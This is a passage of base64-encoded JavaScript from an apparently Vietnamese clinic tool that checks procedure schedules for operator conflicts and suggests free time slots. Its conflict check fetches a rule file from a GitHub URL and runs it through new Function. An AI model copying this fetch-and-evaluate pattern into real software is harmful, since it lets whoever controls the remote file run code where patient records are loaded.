gIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0YXJ0LmRhdGVLZXkgIT09IGVuZC5kYXRlS2V5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ1Ro4bunIHRodeG6rXQgYuG6r3QgxJHhuqd1IHbDoCBr4bq/dCB0aMO6YyBraMOhYyBuZ8OgeScsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydERhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZERhdGU6IGVuZC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlbmQuc2Vjb25kcyA8PSBzdGFydC5zZWNvbmRzKSB7DQogICAgbG9nRXJyb3IoJ1Ro4budaSBnaWFuIGvhur90IHRow7pjIHBo4bqjaSBzYXUgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1Jywgcm93TnVtYmVyLCB7DQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgc3RhcnRWYWx1ZTogcm93W3N0YXJ0SW5kZXhdLA0KICAgICAgICBlbmRWYWx1ZTogcm93W2VuZEluZGV4XSwNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcNCiAgICB9KTsNCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWREdXJhdGlvbiA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0/LmR1cmF0aW9uIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgPSAoZW5kLnNlY29uZHMgLSBzdGFydC5zZWNvbmRzKSAvIDYwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQppZiAoZXhwZWN0ZWREdXJhdGlvbiA+IDAgJiYgTWF0aC5hYnMoYWN0dWFsRHVyYXRpb25NaW51dGVzIC0gZXhwZWN0ZWREdXJhdGlvbikgPiAxKSB7DQogICAgbG9nRXJyb3IoYGAsIHJvd051bWJlciwgew0KICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgIGV4cGVjdGVkOiBleHBlY3RlZER1cmF0aW9uLA0KICAgICAgICBhY3R1YWw6IGFjdHVhbER1cmF0aW9uTWludXRlcywNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gPyByb3dbb3BlcmF0b3JJbmRleF0ucmVwbGFjZSgvLC9nLCAnJykgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIGRhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgIG5nYXlUaHVjSGllbjogZGF0ZUluZGV4ICE9PSAtMSA/IHJvd1tkYXRlSW5kZXhdIDogJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICBzdGFydFRpbWU6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICBlbmRUaW1lOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgIGRvY3Rvcjogcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgLy8gVGjDqm0gZMOybmcgbsOgeQ0KICAgIH0pOw0KfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcm9jZWR1cmVOYW1lID09PSAnU+G6r2MgdGh14buRYyB0aGFuZycpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHByb2NlZHVyZXNbcHJvY2VkdXJlcy5sZW5ndGggLSAxXSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVzLnB1c2goew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvd0luZGV4OiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQoJCQkJCQkJZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDogZW5kLnNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmxpY3Q6IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0UmVhc29uOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVJbmZvOiBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Z2dlc3Rpb246ICcnDQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBM4buXaSB44butIGzDvSBkw7JuZzogJHtlcnJvci5tZXNzYWdlfWAsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcm93W3Byb2NlZHVyZUluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3JEZXRhaWxzOiBlcnJvci5zdGFjaw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignS2jDtG5nIGPDsyB0aOG7pyB0aHXhuq10IG7DoG8gaOG7o3AgbOG7hyDEkeG7gyBraeG7g20gdHJhLiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBk4buvIGxp4buHdS4nKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY2hlY2tDb25mbGljdHMocHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMocHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgZGlzcGxheVJlc3VsdHMocHJvY2VkdXJlcywgc2tpcHBlZFJvd3MpOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA9IGhlcmJQcm9jZWR1cmVzOw0KCQkJCS8vIC0tLSBD4bqtcCBuaOG6rXQgc+G7kSBjYSBraMOhYyDEkWEgc+G7kSB0csOqbiBuw7p0IC0tLQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogIGlmICh0eXBlb2YgdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQgPT09ICdmdW5jdGlvbicpIHsNCiAgICB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpOw0KICB9DQp9LCAxMDApOw0KDQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihlcnJvci5tZXNzYWdlLCBudWxsLCBlcnJvci5zdGFjayk7DQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgICAgIGFsZXJ0KCdDw7MgbOG7l2kgeOG6o3kgcmEga2hpIHjhu60gbMO9IGThu68gbGnhu4d1OiAnICsgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KDQpsZXQgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsNCg0KYXN5bmMgZnVuY3Rpb24gbG9hZENvbmZsaWN0UnVsZXMoKSB7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9jaGF1X3hsdGh1dGh1YXQudHh0P3RzPScgKyBEYXRlLm5vdygpOw0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh1cmwpOw0KICAgICAgICBpZiAoIXJlcy5vaykgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgdOG6o2kgxJHGsOG7o2MgY2hhdV94bHRodXRodWF0LnR4dCcpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9IChhd2FpdCByZXMudGV4dCgpKS50cmltKCk7DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSB04bqjaSBjaGF1X3hsdGh1dGh1YXQudHh0OicsIGUpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9ICcnOyAvLyBmYWxsYmFjazogcuG7l25nIC0+IGNvaSBuaMawIGtow7RuZyBjw7Mgbmdv4bqhaSBs4buHDQogICAgfQ0KfQ0KDQoNCg0KDQogICAgICAgIGZ1bmN0aW9uIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgICAgICAgICAgY29uc3QgZ3JvdXBzID0ge307DQogICAgICAgICAgICANCiAgICAgICAgICAgIHByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBgJHtwcm9jLm9wZXJhdG9yfV8ke3Byb2MuZGF0ZX1gOw0KICAgICAgICAgICAgICAgIGlmICghZ3JvdXBzW2tleV0pIHsNCiAgICAgICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0gPSBbXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0ucHVzaChwcm9jKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBPYmplY3QudmFsdWVzKGdyb3VwcykuZm9yRWFjaChncm91cCA9PiB7DQogICAgICAgICAgICAgICAgZ3JvdXAuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgZ3JvdXAubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldiA9IGdyb3VwW2kgLSAxXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IGdyb3VwW2ldOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2RW5kV2l0aEJ1ZmZlciA9IHByZXYuZW5kICsgKHByZXYucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBpc0FkamFjZW50ID0gaWdub3JlQWRqYWNlbnQgJiYgY3VycmVudC5zdGFydCA9PT0gcHJldi5lbmQ7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudC5zdGFydCA8IHByZXZFbmRXaXRoQnVmZmVyICYmICFpc0FkamFjZW50KSB7DQogICAgICAgICAgICAgICAgIA0KDQpsZXQgaXNDb25mbGljdCA9IHRydWU7DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKGNvbmZsaWN0UnVsZXNUZXh0ICYmIGNvbmZsaWN0UnVsZXNUZXh0LnRyaW0oKSkgew0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb25kaXRpb24gPSBuZXcgRnVuY3Rpb24oJ3ByZXYnLCdjdXJyZW50JywncmV0dXJuICcgKyBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpOw0KICAgICAgICAgICAgLy8gY29uZmxpY3RDb25kaXRpb24oKSBUUuG6oiBW4buAIHRydWUgbuG6v3UgKsSRxrDhu6NjIG1p4buFbiB4dW5nIMSR4buZdCoNCiAgICAgICAgICAgIGNvbnN0IGFsbG93ZWQgPSBjb25mbGljdENvbmRpdGlvbihwcmV2LCBjdXJyZW50KTsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSAhYWxsb3dlZDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOyAvLyBraMO0bmcgY8OzIHJ1bGUgLT4gY+G7qSBiw6FvIHh1bmcgxJHhu5l0DQogICAgICAgIH0NCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSRw6FuaCBnacOhIHh1bmcgxJHhu5l0IHRo4budaSBnaWFuOicsIGVycik7DQogICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzQ29uZmxpY3QpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0UmVhc29uID0gYCR7cHJldi5wcm9jZWR1cmV9PGJyPuKAoiBC4buHbmggbmjDom46ICR7cHJldi5wYXRpZW50TmFtZX08YnI+4oCiIE5nw6B5OiAke3ByZXYuZGF0ZX08YnI+4oCiIFRo4budaSBnaWFuOiAke3ByZXYuZGlzcGxheVN0YXJ0fS0ke3ByZXYuZGlzcGxheUVuZH1gOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFwcmV2LmNvbmZsaWN0UmVhc29uLmluY2x1ZGVzKGN1cnJlbnQucHJvY2VkdXJlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmV2LmNvbmZsaWN0UmVhc29uICs9IChwcmV2LmNvbmZsaWN0UmVhc29uID8gJzxicj48YnI+JyA6ICcnKSArIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYCAke2N1cnJlbnQucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke2N1cnJlbnQucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtjdXJyZW50LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtjdXJyZW50LmRpc3BsYXlTdGFydH0tJHtjdXJyZW50LmRpc3BsYXlFbmR9YDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQpmdW5jdGlvbiBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBidWZmZXJNaW51dGVzID0gaWdub3JlQWRqYWNlbnQgPyAwIDogMTsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpIChu4bq/dSBjaOG7jW4gNiBraHVuZyB0aMOsIDMgc8OhbmcgKyAzIGNoaeG7gXUpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvYy5jb25mbGljdCkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHNhbWVEYXlQcm9jZWR1cmVzID0gcHJvY2VkdXJlcy5maWx0ZXIocCA9PiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gcHJvYy5kYXRlICYmIA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gcHJvYy5vcGVyYXRvciAmJg0KICAgICAgICAgICAgcC5yb3dJbmRleCAhPT0gcHJvYy5yb3dJbmRleA0KICAgICAgICApOw0KDQogICAgICAgIGNvbnN0IGR1cmF0aW9uU2Vjb25kcyA9IHByb2MuZW5kIC0gcHJvYy5zdGFydCArIChidWZmZXJNaW51dGVzICogNjApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgc8OhbmcNCiAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZVNsb3RzKA0KICAgICAgICAgICAgc3RhcnRIb3VyICogMzYwMCwgDQogICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4TW9ybmluZw0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgY2hp4buBdQ0KICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIDEzLjUgKiAzNjAwLCANCiAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4QWZ0ZXJub29uDQogICAgICAgICk7DQoNCiAgICAgICAgLy8gRm9ybWF0IGvhur90IHF14bqjDQogICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+U8Ohbmc6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQoNCiAgICAgICAgDQppZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCArIGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICBjb25zdCBmaXJzdFNsb3QgPSBtb3JuaW5nU2xvdHNbMF0gfHwgYWZ0ZXJub29uU2xvdHNbMF07DQogICAgY29uc3Qgc21hcnRIaW50ID0gYDxicj48ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOjZweDtjb2xvcjojMDA3OTZiO2ZvbnQtd2VpZ2h0OjYwMCI+DQogICAg8J+RiSBH4bujaSDDvTogROG7nWkgdOG7qyA8dT4ke3Byb2MuZGlzcGxheVN0YXJ0fTwvdT4g4oaSIDx1PiR7Zmlyc3RTbG90LnN0YXJ0fTwvdT4NCiAgICA8L2Rpdj5gOw0KDQogICAgcHJvYy5zdWdnZXN0aW9uID0gc3VnZ2VzdGlvbnMuam9pbignPGJyPicpICsgc21hcnRIaW50Ow0KfSBlbHNlIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KfQ0KDQogICAgfSk7DQp9DQovLyBIw6BtIGtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4NCmZ1bmN0aW9uIGhhc1RpbWVDb25mbGljdChzdGFydFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgZW5kVGltZSA9IHN0YXJ0VGltZSArIGR1cmF0aW9uOw0KICAgIA0KICAgIGZvciAoY29uc3QgcHJvYyBvZiBwcm9jZWR1cmVzKSB7DQogICAgICAgIGNvbnN0IHByb2NTdGFydCA9IHByb2Muc3RhcnQ7DQogICAgICAgIGNvbnN0IHByb2NFbmQgPSBwcm9jLmVuZCArIChwcm9jLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICANCiAgICAgICAgaWYgKChzdGFydFRpbWUgPj0gcHJvY1N0YXJ0ICYmIHN0YXJ0VGltZSA8IHByb2NFbmQpIHx8IA0KICAgICAgICAgICAgKGVuZFRpbWUgPiBwcm9jU3RhcnQgJiYgZW5kVGltZSA8PSBwcm9jRW5kKSB8fA0KICAgICAgICAgICAgKHN0YXJ0VGltZSA8PSBwcm9jU3RhcnQgJiYgZW5kVGltZSA+PSBwcm9jRW5kKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KLy8gSMOgbSB0w6xtIGtodW5nIGdp4budIHRy4buRbmcNCmZ1bmN0aW9uIGZpbmRBdmFpbGFibGVTbG90cyhzdGFydFRpbWUsIGVuZFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzLCBtYXhTbG90cykgew0KICAgIGNvbnN0IHNsb3RzID0gW107DQogICAgbGV0IGN1cnJlbnRUaW1lID0gc3RhcnRUaW1lOw0KICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGJ1ZmZlck1pbnV0ZXMgPSBpZ25vcmVBZGphY2VudCA/IDAgOiAxOw0KICAgIA0KICAgIHdoaWxlIChjdXJyZW50VGltZSArIGR1cmF0aW9uIDw9IGVuZFRpbWUgJiYgc2xvdHMubGVuZ3RoIDwgbWF4U2xvdHMpIHsNCiAgICAgICAgaWYgKCFoYXNUaW1lQ29uZmxpY3QoY3VycmVudFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSkgew0KICAgICAgICAgICAgc2xvdHMucHVzaCh7DQogICAgICAgICAgICAgICAgc3RhcnQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUpLA0KICAgICAgICAgICAgICAgIGVuZDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSArIChkdXJhdGlvbiAtIChidWZmZXJNaW51dGVzICogNjApKSkgLy8gVHLhu6sgYnVmZmVyIMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgY3VycmVudFRpbWUgKz0gMTUgKiA2MDsgLy8gS2nhu4NtIHRyYSBt4buXaSAxNSBwaMO6dA0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc2xvdHM7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gc2Vjb25kc1RvVGltZVN0cihzZWNvbmRzKSB7DQogICAgICAgICAgICBjb25zdCBob3VycyA9IE1hdGguZmxvb3Ioc2Vjb25kcyAvIDM2MDApOw0KICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IE1hdGguZmxvb3IoKHNlY29uZHMgJSAzNjAwKSAvIDYwKTsNCiAgICAgICAgICAgIHJldHVybiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YDsNCiAgICAgICAgfQ0KDQoNCi8vIMSQ4bq/bSB04buVbmcgY2EgInPhuq9jIHRodeG7kWMiIGtow6FjIMSRYSBz4buRIChvdXRsaWVyKQ0KZnVuY3Rpb24gZ2V0SGVyYk91dGxpZXJUb3RhbCgpIHsNCiAgY29uc3QgaGVyYnMgPSBBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgOiBbXTsNCiAgY29uc3QgY291bnRzQnlEYXRlID0ge307DQogIGhlcmJzLmZvckVhY2goaCA9PiB7DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBuID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBpZiAoIWNvdW50c0J5RGF0ZVtkXSkgY291bnRzQnlEYXRlW2RdID0ge307DQogICAgY291bnRzQnlEYXRlW2RdW25dID0gKGNvdW50c0J5RGF0ZVtkXVtuXSB8fCAwKSArIDE7DQogIH0pOw0KICBsZXQgb3